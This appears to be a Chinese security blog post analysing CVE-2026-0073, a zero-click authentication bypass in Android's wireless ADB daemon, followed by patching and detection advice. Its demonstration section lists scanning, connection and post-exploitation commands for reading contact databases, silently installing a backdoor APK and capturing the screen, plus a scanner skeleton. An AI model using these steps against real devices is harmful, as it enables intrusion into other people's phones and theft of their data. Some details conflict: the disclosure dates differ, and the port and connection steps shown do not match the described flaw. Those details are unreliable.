#  安卓系统存在严重零点击漏洞，无需交互即可获得远程 Shell 访问权限  
原创 A译
                    A译  黑白之道   2026-05-06 00:39  
  
> **导语**  
：2026年5月4日，Google发布5月Android安全公告，披露了编号为CVE-2026-0073的高危零点击远程代码执行漏洞。该漏洞存在于Android调试桥守护进程（adbd）中，攻击者只需与目标设备处于同一局域网，无需任何用户交互即可绕过无线ADB双向认证机制，获得设备shell访问权限。从酒店WiFi到企业办公网络，任何可接入的共享网络都可能成为入侵入口。  
  
## 一、漏洞概述  
### 1.1 漏洞基本信息  
  
CVE-2026-0073是Android系统组件中的一个严重认证绕过漏洞，其核心信息如下：  
  
**漏洞类型**  
：身份验证绕过（Authentication Bypass / Logic Error）  
  
**受影响组件**  
：Android System — adbd（Android调试桥守护进程，属于Project Mainline模块）  
  
**攻击向量**  
：相邻网络（Adjacent Network / Proximal）—— 攻击者需与目标设备处于同一局域网段  
  
**用户交互**  
：无（Zero-Click）—— 完全无需用户点击、下载或确认任何内容  
  
**所需权限**  
：无（None）—— 攻击前无需任何权限  
  
**影响后果**  
：远程代码执行（Remote Code Execution），以shell用户身份运行  
  
**严重程度**  
：严重（Critical）  
  
**修复版本**  
：2026年5月1日安全补丁级别（Security Patch Level 2026-05-01）  
  
CVE编号由NIST国家漏洞数据库收录，发布日期为2026年5月4日。香港电脑保安事故协调中心（HKCERT）也于5月5日发布了专门的安全公告，将该漏洞列为远程代码执行威胁进行预警。  
### 1.2 影响范围  
  
该漏洞影响以下Android版本中未更新至2026年5月安全补丁的设备：  
<table><thead><tr><th style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;text-align: center;font-weight: bold;color: rgb(72, 112, 172);background: rgb(247, 247, 247);"><section><span leaf="">Android版本</span></section></th><th style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;text-align: center;font-weight: bold;color: rgb(72, 112, 172);background: rgb(247, 247, 247);"><section><span leaf="">状态</span></section></th><th style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;text-align: center;font-weight: bold;color: rgb(72, 112, 172);background: rgb(247, 247, 247);"><section><span leaf="">所需补丁级别</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">Android 14</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">受影响</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">2026-05-01</span></section></td></tr><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">Android 15</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">受影响</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">2026-05-01</span></section></td></tr><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">Android 16</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">受影响</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">2026-05-01</span></section></td></tr><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">Android 16 QPR2</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">受影响</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">2026-05-01</span></section></td></tr></tbody></table>  
由于adbd组件通过Project Mainline模块化分发，Google可以直接通过Google Play系统更新推送修复，绕过了传统运营商和OEM更新渠道的延迟问题。但现实情况是，大量设备仍处于未修补状态，尤其是较老的设备和不再获得厂商安全更新的机型。  
## 二、技术原理深度剖析  
### 2.1 Android无线调试机制回顾  
  
要理解CVE-2026-0073的利用原理，首先需要了解Android无线调试的工作机制。Android 11引入了无线调试功能，允许开发者通过Wi-Fi网络而非USB线连接设备进行调试。这一功能通过adbd（Android Debug Bridge daemon）实现。  
  
无线ADB连接流程涉及以下安全机制：  
  
**mDNS服务发现**  
：当设备开启无线调试时，adbd进程在随机TCP端口监听，并通过mDNS协议广播其存在，允许同一网络上的主机发现该设备。  
  
**TLS双向认证**  
：从Android 11开始，无线ADB连接使用TLS mutual authentication（双向TLS认证）。这意味着：  
- 设备需要验证连接主机的证书  
  
- 主机也需要验证设备的证书  
  
- 只有之前已配对的设备才能建立连接  
  
**配对密钥存储**  
：首次配对时，主机和设备交换公钥，存储在/data/misc/adb/adb_keys  
文件中，后续连接时进行验证。  
### 2.2 漏洞根因：adbd_tls_verify_cert逻辑错误  
  
CVE-2026-0073的根因在于auth.cpp  
文件中的adbd_tls_verify_cert  
函数存在逻辑错误。该函数负责在无线ADB配对和连接流程中验证连接主机的TLS证书。问题在于证书验证逻辑中存在缺陷，允许攻击者完全绕过双向认证机制。  
  
具体来说，正常的证书验证流程应该包括：  
1. 检查证书签名是否有效  
  
1. 验证证书是否在有效期内  
  
1. 检查证书是否与已存储的配对密钥匹配  
  
1. 验证证书的使用用途是否符合要求  
  
而adbd_tls_verify_cert  
函数的逻辑错误导致攻击者可以通过发送精心构造的输入，绕过上述验证步骤，直接建立起一个"已认证"的调试会话。这意味着攻击者无需持有有效的配对密钥，只要能够向目标设备发送网络数据包，就能伪装成已配对主机。  
### 2.3 为什么是"零点击"  
  
漏洞被称为"零点击"（Zero-Click）是因为整个攻击过程不需要目标用户的任何参与。传统的攻击链往往需要用户配合，例如点击恶意链接、安装恶意应用、或批准安全提示。而CVE-2026-0073的攻击路径完全自动化：  
1. 攻击者位于目标设备的同一局域网（例如酒店WiFi、企业网络、机场公共网络）  
  
1. 通过mDNS发现开启无线调试的设备  
  
1. 发送特制的网络数据包触发adbd_tls_verify_cert  
的逻辑漏洞  
  
1. 直接获得shell访问权限  
  
整个过程不需要目标用户进行任何操作，甚至用户可能完全不知情。这种攻击模式对公共网络环境构成严重威胁——在酒店大堂、咖啡馆或会议室等共享网络环境中，攻击者只需扫描网络即可发现并入侵脆弱设备。  
## 三、漏洞利用演示  
### 3.1 漏洞利用前提条件  
  
成功利用CVE-2026-0073需要满足以下条件：  
- 目标设备开启了无线调试（Wireless Debugging）功能  
  
- 攻击者与目标设备处于同一局域网段（Wi-Fi网络或可路由的相邻网络）  
  
- 目标设备尚未安装2026年5月安全补丁  
  
### 3.2 攻击流程解析  
  
以下内容仅供安全研究人员和渗透测试人员学习使用，请勿用于非法用途。  
  
**第一步：发现目标设备**  
  
攻击者首先需要识别网络中开启了无线ADB监听的设备。无线调试通过mDNS协议广播服务，可被同一网络上的主机发现：  
```
# 使用nmap扫描5555端口（无线ADB默认端口）发现开启无线调试的设备nmap -p 5555 192.168.1.0/24 --open# 或者使用adb工具的discover功能adb kill-serveradb start-server
```  
  
在真实攻击场景中，攻击者可能会编写自动化脚本，持续扫描特定网段并记录发现的脆弱设备。  
  
**第二步：连接目标设备**  
  
发现目标设备后，攻击者尝试建立连接。由于adbd_tls_verify_cert  
的逻辑漏洞，连接请求会被错误地认定为已认证：  
```
# 尝试连接到目标设备adb connect <目标IP地址>:5555
```  
  
如果目标设备存在漏洞，这将成功建立连接，无需提供任何有效凭证。  
  
**第三步：获取Shell访问**  
  
连接成功后，攻击者立即获得shell级别的访问权限：  
```
# 建立连接后直接获取shelladb shell
```  
  
这个shell以Android的"shell"用户身份运行，虽然不是root权限，但已经具备相当大的攻击能力。  
### 3.3 获取Shell后的攻击能力  
  
一旦获得shell访问权限，攻击者可以执行以下操作：  
  
**数据提取**  
：  
```
# 读取应用数据（针对可调试应用）cat /data/data/com.example.app/databases/app.db# 获取联系人、短信等敏感数据cat /data/data/com.android.providers.contacts/databases/contacts2.db# 读取用户文件ls /storage/emulated/0/
```  
  
**恶意软件安装**  
：  
```
# 安装后门应用adb install malicious.apk# 静默安装（无需用户确认）pm install -r malicious.apk
```  
  
**监控与收集**  
：  
```
# 屏幕截图screencap /sdcard/screenshot.png# 录屏screenrecord /sdcard/video.mp4# 实时日志logcat
```  
  
**权限提升准备**  
：  
  
虽然shell用户不具备root权限，但攻击者可以利用其他漏洞或配置错误进行权限提升。此外，shell用户可以访问调试接口和应用沙箱，为进一步入侵奠定基础。  
### 3.4 网络扫描示例代码  
  
以下是安全研究人员用于验证设备脆弱性的自动化扫描脚本示例框架：  
```
#!/usr/bin/env python3"""CVE-2026-0073 漏洞验证脚本（仅供安全研究使用）作者：安全研究团队"""import socketimport subprocessimport timedefscan_for_vulnerable_devices(network_range, port=5555):    """扫描指定网段中开启无线ADB的设备"""    print(f"[*] 正在扫描 {network_range} 的 {port} 端口...")        # 实际使用时需要使用完整的网络扫描逻辑    # 此处仅展示关键代码结构        return []defattempt_connection(ip, port=5555):    """尝试连接到目标设备"""    try:        result = subprocess.run(            ['adb', 'connect', f'{ip}:{port}'],            capture_output=True,            text=True,            timeout=5        )                if'connected'in result.stdout.lower():            print(f"[+] 成功连接到 {ip}:{port}")            returnTrue    except Exception as e:        print(f"[-] 连接失败: {e}")        returnFalsedefmain():    target_network = "192.168.1.0/24"# 示例网段    vulnerable_devices = scan_for_vulnerable_devices(target_network)        for device_ip in vulnerable_devices:        if attempt_connection(device_ip):            print(f"[+] {device_ip} 可能存在CVE-2026-0073漏洞")            # 进一步验证代码...if __name__ == "__main__":    main()
```  
## 四、防御与修复方案  
### 4.1 即时修复措施  
  
**安装安全更新**  
：  
  
用户应立即检查并安装2026年5月安全补丁：  
1. 进入「设置」→「关于手机」→「Android版本」  
  
1. 查看「安全补丁级别」是否为"2026年5月1日"或更晚  
  
1. 如未更新，前往「设置」→「系统」→「软件更新」安装最新OTA更新  
  
**检查Google Play系统更新**  
：  
  
部分设备会通过Google Play系统更新渠道接收组件补丁：  
1. 进入「设置」→「安全与隐私」→「系统与更新」  
  
1. 选择「Google Play系统更新」  
  
1. 安装所有可用更新后重启设备  
  
**禁用无线调试**  
：  
  
在安装补丁前，建议临时禁用无线调试功能：  
1. 进入「设置」→「开发者选项」→「无线调试」  
  
1. 关闭无线调试开关  
  
1. 或直接关闭「开发者选项」  
  
### 4.2 网络层防护  
  
**企业网络隔离**  
：  
  
对于管理大量Android设备的企业，建议采取以下网络层措施：  
- 在企业防火墙阻断TCP 5555端口的出站和入站流量  
  
- 实施802.1X网络访问控制，限制未知设备接入  
  
- 对移动设备实施网络微分段，隔离敏感网络区域  
  
**设备MDM管理**  
：  
  
企业可通过MDM解决方案（如VMware Workspace ONE、Microsoft Intune）强制执行以下策略：  
- 自动推送安全更新，未更新设备强制下线  
  
- 远程禁用无线调试功能  
  
- 持续监控设备安全状态  
  
### 4.3 检测与响应  
  
**日志分析**  
：  
  
安全人员可通过以下命令检测可疑活动：  
```
# 检查ADB相关日志adb logcat -b events | grep "adb"# 查找异常的shell进程ps -A | grep shell# 检查未授权的ADB配对密钥cat /data/misc/adb/adb_keys# 查看网络连接netstat -tunap | grep 5555
```  
  
**MTD工具部署**  
：  
  
企业应部署移动威胁防御（MTD）解决方案（如Lookout、Zimperium），实时检测异常行为和攻击尝试。  
## 五、漏洞时间线  
<table><thead><tr><th style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;text-align: center;font-weight: bold;color: rgb(72, 112, 172);background: rgb(247, 247, 247);"><section><span leaf="">时间节点</span></section></th><th style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;text-align: center;font-weight: bold;color: rgb(72, 112, 172);background: rgb(247, 247, 247);"><section><span leaf="">事件</span></section></th></tr></thead><tbody><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">2026年5月1日</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">Google发布5月Android安全公告，公布CVE-2026-0073漏洞及修复方案</span></section></td></tr><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">2026年5月4日</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">NIST NVD收录该漏洞，公开详细信息</span></section></td></tr><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">2026年5月5日</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">香港电脑保安事故协调中心（HKCERT）发布专项安全公告</span></section></td></tr><tr><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">2026年5月（预计）</span></section></td><td style="border: 1px solid rgb(217, 223, 228);padding: 9px 12px;font-size: 0.75em;line-height: 22px;vertical-align: top;"><section><span leaf="">AOSP源代码补丁将在公告发布后48小时内释出</span></section></td></tr></tbody></table>## 六、安全建议总结  
  
对于普通用户：CVE-2026-0073再次提醒我们，公共WiFi网络的危险性不仅限于数据窃听。攻击者可能利用网络中的脆弱设备进行入侵。请尽快安装系统更新，在不使用时关闭开发者选项中的无线调试功能。  
  
对于企业安全团队：建议立即清点网络中开启无线调试的Android设备，通过MDM推送紧急更新。同时在防火墙层面阻断5555端口的流量，并准备针对此类零点击漏洞的应急响应预案。  
  
对于移动安全研究人员：该漏洞的利用代码可能很快出现在公开仓库中，建议在隔离环境中进行研究学习，深入理解adbd组件的认证机制和Project Mainline的安全更新分发模式。  
  
**零点击漏洞正在成为移动安全的新常态**  
——从短信零点击漏洞到无线ADB认证绕过，攻击者不断突破"需要用户配合"这条最后的防线。防御思路必须从"阻止用户犯错"转向"假设系统已被入侵"的零信任架构。  
  
**版权声明**  
：本文由华盟网原创发布，保留所有权利。配图由华盟网授权使用。  
  
